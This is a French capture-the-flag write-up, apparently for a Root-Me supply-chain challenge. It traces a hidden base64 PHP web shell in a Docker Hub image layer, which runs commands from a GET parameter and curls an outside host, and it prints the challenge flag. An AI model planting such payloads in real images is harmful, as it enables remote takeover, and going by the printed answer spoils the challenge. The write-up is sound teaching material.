help link: https://hub.docker.com/
readme: https://grottedubarbu.fr/docker-hub-jungle-images/

- A savoir:
Une attaque de la chaîne d'approvisionnement (supply chain attack) est une cyberattaque qui exploite une vulnérabilité chez un fournisseur ou un partenaire tiers pour s'introduire dans le réseau de sa cible. Au lieu d'attaquer une entreprise directement, les pirates ciblent des maillons moins sécurisés de sa "chaîne logistique" numérique, comme un éditeur de logiciels, pour y injecter un logiciel malveillant qui se propagera ensuite à tous les clients de ce fournisseur.

- fichier fournis:
```
$ unzip ch36.zip

(base) ┌──(isaak㉿init-1)-[~/Downloads/awesome_webserver]  
└─$ ls  
docker-compose.yml  Dockerfile  nginx  README.md
```

- on pourrait penser a faire *docker compose up -d*  comme moi mais des le depart on rencontre des erreurs sur les images qui pour certains n existe plus et d'autre qui sont mal configurer dans le docker compose car il n y'a pas de derniere version comme signifier dans le docker compose mais des anciennes version disponible sur le hub.

![Texte alternatif de l'image](image/im111.png)

En voyant cette sortie on se dit qu 'on doit changer les config et demarre les services coute que coute mais c'etait pas la bonne approche le contenu des containers ne nous servira.
Apres lecture, relecture du challenge et recherche sur le titre  du challenge on tombe sur l'explication donner plus haut. c'etait plus detaille que ca mais en gros c'est ce qu'on doit retenir. 
Fallait donc changer d'approche mais meme en pensant autrement c'etait pas la methode je dirai que je suis tombe sur le flag donc comment j'ai procede ?

- comme les services ne demarrais pas je me suis dis que je devais verifiier les images qui sont dans le docker compose. prenons donc la premiere image (la valeur qui se trouve dans le champ image du docker compose) et recherchons sur le hub de docker en n'oubliant as d'aller sur la version signifier dans le docker compose c'est a dire le tag.
	**EX: bodsch/docker-jolokia:1.6.0**

![Texte alternatif de l'image](image/im112.png)

etant la je me suis mis a cliquer sur les differentes ccouches afin de comprendre ce qui etait marque et ce qui m'etait incomprehensible je le copiait et le donnait a gpt puisse que je ne savais pas a quoi m'attendre et cela je l'ai fais pour chaque image en commencant par nginx jusqu'a ce que je tombe sur  ==apachetwo/apache2_php:1.5== qui a la couche 17 a un champ diffrent.
```
/bin/sh -c echo $(echo "PD9waHAgc3lzdGVtKCRfR0VUW2Jhc2U2NF9kZWNvZGUoJ2NIZHVaV1E9JyldKTtzaGVsbF9leGVjKGJhc2U2NF9kZWNvZGUoJ1kzVnliQ0F0TFhWelpYSXRZV2RsYm5RZ0oxSk5lM1JJTVhOZmN6Tnlkak5TWHpGelgzQlhiak5rZlNjZ2FIUjBjRG92THpFNU9DNDFNUzR4TURBdU5ESXYnKSk7Pz4=" | base64 -d) >> index.php
```
![Texte alternatif de l'image](image/im113.png)

- utilisation de cyberchef (from base64)

![Texte alternatif de l'image](image/im114.png)

- on constate la presence de chaine encode donc second decodage 

![Texte alternatif de l'image](image/115.png)

voila le flag trouve sans vraiment savoir qu'on le trouverait ici: RM{tH1s_s3rv3R_1s_pWn3d}

- #### other solutions:
`docker-compose -f docker-compose.yml up`

```
1. └─> docker image ls                                                
2. REPOSITORY              TAG       IMAGE ID       CREATED         SIZE
3. willfarrell/autoheal    latest    cda9562a4767   31 hours ago    8.86MB
4. bitnami/phpmyadmin      latest    b59e54294070   3 days ago      412MB
5. nginx                   latest    88736fe82739   2 weeks ago     142MB
6. apachetwo/apache2_php   1.5       65ba42a1bca7   5 weeks ago     988MB
7. hello-world             linux     feb5d9fea6a5   14 months ago   13.3kB
8. bodsch/docker-jolokia   1.6.0     9a7f36095dd9   2 years ago     223MB
9. cloudesire/tomcat       8-jre8    724f4f49f989   4 years ago     317MB
```

En regardant l’historique des repos, on remarque une info qui pourrait être intéréssante pour la suite du ctf :
```
1. ─> docker history apachetwo/apache2_php:1.5                          
2. IMAGE          CREATED        CREATED BY                                      SIZE      COMMENT
3. 65ba42a1bca7   5 weeks ago    /bin/sh -c #(nop)  EXPOSE 80                    0B        
4. <missing>      5 weeks ago    /bin/sh -c echo $(echo "PD9waHAgc3lzdGVtKCRf…   168B
```

On exporte les infos :
```
- └─> docker save apachetwo/apache2_php:1.5 -o apache2.tar
- └─# tar xvf apache2.tar
```

On obtient alors un grand nombre de dossiers. Un “ grep -rnw ./ -e "flag" ” pour voir si le flag est en clair ne donne rien. Cependant le fichier “repositories” nous donne le nom d’un dossier intéressant :
```
`└─> cat repositories                                                     {"apachetwo/apache2_php":{"1.5":"7500bfa3b1be3fbea543a49510e7d9621f003d87e71daad944a76b8666d65f7e"}}`
```

Voyons ça de plus près :
```
1. └─> cd 7500bfa3b1be3fbea543a49510e7d9621f003d87e71daad944a76b8666d65f7e
2. └─# tar xvf layer.tar  
3. └─# cat index.php      
4. ?php system($_GET[base64_decode('cHduZWQ=')]);shell_exec(base64_decode('Y3VybCAtLXVzZXItYWd...NDIv'));?>
[Télécharger](https://www.root-me.org/local/cache-code/45933824644202da047991a7c6ed95b9.txt)
```

Nous n’avons plus qu’à décoder la chaine de caractère en base64 pour obtenir le flag :
```
1. └─> echo "Y3VybCAtLXVzZXItYWdlbnQgJ1JNe3...S4xMDAuNDIv" | base64 --decode
2. curl --user-agent 'RM{tH***********3d}' http://198.51.100.42/
```
